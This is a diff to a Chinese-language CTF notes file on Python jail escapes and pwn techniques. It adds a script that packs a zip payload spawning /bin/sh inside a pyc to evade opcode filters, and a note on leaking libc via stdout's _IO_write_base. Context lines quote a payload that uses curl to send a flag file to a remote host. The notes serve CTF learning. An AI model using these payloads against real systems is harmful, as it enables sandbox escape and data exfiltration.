@@ -472,6 +472,23 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
 - [You shall not call](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call),[wp](https://gist.github.com/lebr0nli/eec8f5addd77064f1fa0e8b22b6a54f5)；[You shall not call Revenge](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call-revenge),[wp](https://gist.github.com/lebr0nli/53216005991d012470c0bde0f38952b1):两个都是有关pickle的的pyjail，用有限的pickle code构造pickle object。前者只需读文件，revenge需要得到rce
 - [My Third Calculator](https://ireland.re/posts/TheFewChosen_2023/#my-third-calculator):`__import__('antigravity',setattr(__import__('os'),'environ',{'BROWSER':'/bin/sh -c "curl -T flag ip;exit" #%s'}))`.antigravity是python里一个彩蛋模块，导入它会打开[xkcd](https://xkcd.com/353/)。通过将环境变量browser改为shell命令，就能在导入时执行shell命令而不是打开网页
 - `list(open("flag.txt"))`:需要在`print(eval(input()))`或者python console的情况下使用。单纯eval是没有输出的
+- [PyPlugins](https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#pyplugins): python是能接受zip file当作input的(参考zipapp)，里面的运作原理和一般zip解压缩很像，就是找zip的end of central directory之类的。另一方面CPython还有个pyc档案包含了一些header和code object，而code object上又会有co_consts的存在。所以如果你有个Python里面有个很长的byte literal包含了一个zip，它编译成pyc之后会直接在里面展开，而此时去执行它的时候CPython反而是会因为那个zip signature而把它误认成zip来执行。可利用此绕过非常严格的opcodes限制。`runpy.run_path(py_compile.compile(path))`
+```py
+#生成path指向的文件内容
+import tempfile
+import zipfile
+import base64
+def create_zip_payload() -> bytes:
+    file_name = "__main__.py"
+    file_content = b'import os;os.system("/bin/sh")'
+    with tempfile.TemporaryFile(suffix=".zip") as f:
+        with zipfile.ZipFile(f, "w") as z:
+            z.writestr(file_name, file_content)
+        f.seek(0)
+        return f.read()
+temp=f"pwn={create_zip_payload()!r}"
+print(base64.b64encode(temp.encode()))
+```
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 ```python
 p=remote("",443,ssl=True)
@@ -1228,3 +1245,6 @@ int main() {
 - pwntools FmtStr object使用
 116. [format_level3](../../CTF/moectf/2023/Pwn/format_level3.md)
 - bss段上的格式化字符串。之前其实记过，就是用args和三级指针。但是做这题时发现了一个如果本地偏移和远程不一样时（且无法获取远程dockerfile调试）的做法
+117. [feedback](../../CTF/moectf/2023/Pwn/feedback.md)
+- stdout利用。若地址未知，覆盖_IO_write_base的最后一个字节将其改小就能泄露libc地址。若地址已知，直接更改_IO_write_base和_IO_write_ptr实现任意地址读
+- 一般都能成功，只有一种情况例外：_IO_write_base最后一个字节本身就很小，比如是`0x3`。这时改成`\x00`也只能泄露0x3个字节（`_IO_write_ptr`默认和`_IO_write_base`一样）
